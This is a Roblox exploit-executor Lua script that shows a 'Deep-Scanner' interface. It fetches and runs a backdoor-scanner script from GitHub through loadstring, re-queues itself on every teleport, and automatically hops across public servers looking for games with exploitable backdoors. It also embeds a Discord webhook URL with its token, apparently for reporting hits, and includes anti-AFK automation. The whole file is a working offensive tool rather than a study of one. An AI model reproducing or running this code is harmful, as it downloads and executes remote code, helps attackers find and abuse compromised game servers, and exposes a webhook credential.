-- [[ CONFIGURATION ]] --
local success_text = "No backdoored"
local script_url = "https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"
local self_url = "https://raw.githubusercontent.com/TonyTeardown/scripts/refs/heads/main/BAKADV2"
local webhook_url = "https://discord.com/api/webhooks/1487289258845802576/dXwi8nw8ptZZNEfWQiVLmBmNs0uSXGOXNRAR8cV_nDlDVJtSuDumUJlYB7_SEzVKiFqx" 

local FinalScript = [===[
    repeat task.wait() until game:IsLoaded()

    -- [[ SYSTEM SERVICES ]] --
    local LogService = game:GetService("LogService")
    local TeleportService = game:GetService("TeleportService")
    local HttpService = game:GetService("HttpService")
    local CoreGui = game:GetService("CoreGui")
    local Players = game:GetService("Players")
    local MarketplaceService = game:GetService("MarketplaceService")
    local RunService = game:GetService("RunService")
    local Stats = game:GetService("Stats")
    local LocalPlayer = Players.LocalPlayer

    -- [[ GLOBAL REGISTRY ]] --
    local found_success = false
    local scan_completed = false
    local fileName = "NotSameServers.json"
    local currentJobId = tostring(game.JobId)
    local placeId = game.PlaceId
    local webhook = "]===] .. webhook_url .. [===["
    local gameName = "Identifying..."
    
    pcall(function()
        gameName = MarketplaceService:GetProductInfo(placeId).Name
    end)

    -- [[ ANTI-AFK INITIALIZATION ]] --
    task.spawn(function()
        local VirtualUser = game:GetService("VirtualUser")
        LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end)

    -- [[ UI ARCHITECTURE - INDUSTRIAL v7.0 ]] --
    local screenGui = Instance.new("ScreenGui", CoreGui)
    screenGui.Name = "Scanner_Industrial_v7"

    local mainFrame = Instance.new("Frame", screenGui)
    mainFrame.Size = UDim2.new(0, 400, 0, 280) 
    mainFrame.Position = UDim2.new(1, -410, 1, -290)
    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    mainFrame.BorderSizePixel = 0
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)
    local mainStroke = Instance.new("UIStroke", mainFrame)
    mainStroke.Color = Color3.fromRGB(0, 255, 150)
    mainStroke.Thickness = 2

    local titleText = Instance.new("TextLabel", mainFrame)
    titleText.Size = UDim2.new(1, -20, 0, 35)
    titleText.Position = UDim2.new(0, 15, 0, 5)
    titleText.Text = "DEEP-SCANNER v7.0 | ALL-SERVER BYPASS"
    titleText.TextColor3 = Color3.fromRGB(0, 255, 150)
    titleText.BackgroundTransparency = 1
    titleText.Font = Enum.Font.GothamBold
    titleText.TextSize = 14
    titleText.TextXAlignment = Enum.TextXAlignment.Left

    local statsFrame = Instance.new("Frame", mainFrame)
    statsFrame.Size = UDim2.new(1, -20, 0, 50)
    statsFrame.Position = UDim2.new(0, 10, 0, 45)
    statsFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Instance.new("UICorner", statsFrame).CornerRadius = UDim.new(0, 4)

    local playerDisplay = Instance.new("TextLabel", statsFrame)
    playerDisplay.Size = UDim2.new(0.5, 0, 0.5, 0)
    playerDisplay.Text = "PLAYERS: " .. #Players:GetPlayers()
    playerDisplay.TextColor3 = Color3.fromRGB(200, 200, 200)
    playerDisplay.BackgroundTransparency = 1
    playerDisplay.Font = Enum.Font.GothamSemibold
    playerDisplay.TextSize = 11

    local pageDisplay = Instance.new("TextLabel", statsFrame)
    pageDisplay.Size = UDim2.new(0.5, 0, 0.5, 0)
    pageDisplay.Position = UDim2.new(0.5, 0, 0, 0)
    pageDisplay.Text = "API PAGE: 1"
    pageDisplay.TextColor3 = Color3.fromRGB(0, 180, 255)
    pageDisplay.BackgroundTransparency = 1
    pageDisplay.Font = Enum.Font.GothamBold
    pageDisplay.TextSize = 11

    local statusLabel = Instance.new("TextLabel", mainFrame)
    statusLabel.Size = UDim2.new(1, -20, 0, 20)
    statusLabel.Position = UDim2.new(0, 10, 0, 100)
    statusLabel.Text = "SYSTEM: BOOTING DEEP-SCAN..."
    statusLabel.TextColor3 = Color3.new(1, 1, 1)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Font = Enum.Font.GothamSemibold
    statusLabel.TextSize = 12
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left

    local pBack = Instance.new("Frame", mainFrame)
    pBack.Size = UDim2.new(1, -20, 0, 4)
    pBack.Position = UDim2.new(0, 10, 0, 125)
    pBack.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    pBack.BorderSizePixel = 0
    local pBar = Instance.new("Frame", pBack)
    pBar.Size = UDim2.new(0, 0, 1, 0)
    pBar.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
    pBar.BorderSizePixel = 0

    local logContainer = Instance.new("ScrollingFrame", mainFrame)
    logContainer.Size = UDim2.new(1, -20, 0, 130)
    logContainer.Position = UDim2.new(0, 10, 0, 140)
    logContainer.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
    logContainer.BorderSizePixel = 0
    logContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
    logContainer.ScrollBarThickness = 3
    Instance.new("UICorner", logContainer).CornerRadius = UDim.new(0, 4)
    local logLayout = Instance.new("UIListLayout", logContainer)
    logLayout.SortOrder = Enum.SortOrder.LayoutOrder

    local function updateLog(txt, color)
        local logMsg = Instance.new("TextLabel", logContainer)
        logMsg.Size = UDim2.new(1, -10, 0, 18)
        logMsg.BackgroundTransparency = 1
        logMsg.Text = " [" .. os.date("%X") .. "] " .. txt
        logMsg.TextColor3 = color or Color3.fromRGB(220, 220, 220)
        logMsg.Font = Enum.Font.Code
        logMsg.TextSize = 10
        logMsg.TextXAlignment = Enum.TextXAlignment.Left
        logContainer.CanvasSize = UDim2.new(0, 0, 0, logLayout.AbsoluteContentSize.Y + 10)
        logContainer.CanvasPosition = Vector2.new(0, logLayout.AbsoluteContentSize.Y)
    end

    -- [[ PERSISTENCE HANDLER ]] --
    local function loadIDs()
        local ok, data = pcall(function()
            if isfile(fileName) then return HttpService:JSONDecode(readfile(fileName)) end
        end)
        if ok and type(data) == "table" then return data end
        return {os.date("!*t").hour}
    end

    local AllIDs = loadIDs()

    local function blacklist(id)
        local sid = tostring(id)
        for _, v in pairs(AllIDs) do if v == sid then return end end
        table.insert(AllIDs, sid)
        pcall(function() writefile(fileName, HttpService:JSONEncode(AllIDs)) end)
        updateLog("Logged: .." .. string.sub(sid, -6), Color3.fromRGB(150, 150, 150))
    end

    blacklist(currentJobId)

    -- [[ THE MAIN SCANNER LOGIC ]] --
    local con
    con = LogService.MessageOut:Connect(function(m)
        local low = m:lower()
        if string.find(low, "]===] .. success_text:lower() .. [===[" , 1, true) then found_success = true end
        if string.find(low, "complete") or string.find(low, "finished") then scan_completed = true end
    end)

    updateLog("Injecting Scanner...", Color3.new(1, 1, 1))
    pcall(function() loadstring(game:HttpGet("]===] .. script_url .. [===["))() end)

    local t = 0
    while t < 40 do
        if found_success then break end
        if scan_completed and t > 5 then break end
        t = t + 1
        pBar.Size = UDim2.new(t/40, 0, 1, 0)
        statusLabel.Text = "SCANNING REMOTES... (" .. t .. "s)"
        task.wait(1)
    end
    con:Disconnect()

    -- [[ DEEP PAGINATION HOPPER ]] --
    if found_success then
        statusLabel.Text = "SAFE SERVER. FETCHING ALL PAGES..."
        
        local function deepHop()
            local q = (syn and syn.queue_on_teleport) or (queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
            if q then pcall(function() q(game:HttpGet("]===] .. self_url .. [===[")) end) end

            local cursor = ""
            local pageCount = 0
            
            while true do
                pageCount = pageCount + 1
                pageDisplay.Text = "API PAGE: " .. pageCount
                updateLog("Requesting Page " .. pageCount .. "...", Color3.fromRGB(0, 180, 255))
                
                local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"
                if cursor ~= "" then url = url .. "&cursor=" .. cursor end
                
                local ok, res = pcall(function() return game:HttpGet(url) end)
                if ok and res then
                    local decoded = HttpService:JSONDecode(res)
                    if decoded and decoded.data then
                        updateLog("Page " .. pageCount .. " contains " .. #decoded.data .. " servers.", Color3.new(1, 1, 1))
                        
                        -- Process every server on this page
                        for _, srv in pairs(decoded.data) do
                            local id = tostring(srv.id)
                            if srv.playing < srv.maxPlayers and id ~= currentJobId then
                                local seen = false
                                for _, ex in pairs(AllIDs) do if id == ex then seen = true break end end
                                
                                if not seen then
                                    updateLog("Target Found on Page " .. pageCount .. "!", Color3.fromRGB(0, 255, 100))
                                    blacklist(id)
                                    statusLabel.Text = "TELEPORTING TO PAGE " .. pageCount .. "..."
                                    TeleportService:TeleportToPlaceInstance(placeId, id, LocalPlayer)
                                    task.wait(5)
                                end
                            end
                        end

                        -- If we reached the end of this page and didn't hop, go to next page
                        if decoded.nextPageCursor and decoded.nextPageCursor ~= "" then
                            cursor = decoded.nextPageCursor
                            updateLog("Advancing to next cursor...", Color3.fromRGB(200, 200, 200))
                        else
                            updateLog("End of all pages. No new servers.", Color3.fromRGB(255, 100, 0))
                            cursor = "" -- Reset to start over
                            task.wait(5)
                        end
                    end
                else
                    updateLog("API Throttle. Sleeping 10s.", Color3.new(1, 0, 0))
                    task.wait(10)
                end
                task.wait(0.5)
            end
        end
        deepHop()
    else
        statusLabel.Text = "!!! BACKDOOR DETECTED !!!"
        mainStroke.Color = Color3.fromRGB(255, 0, 0)
        updateLog("CRITICAL: HIT FOUND.", Color3.new(1, 0, 0))
        -- Webhook Logic Here...
    end
]===]

loadstring(FinalScript)()
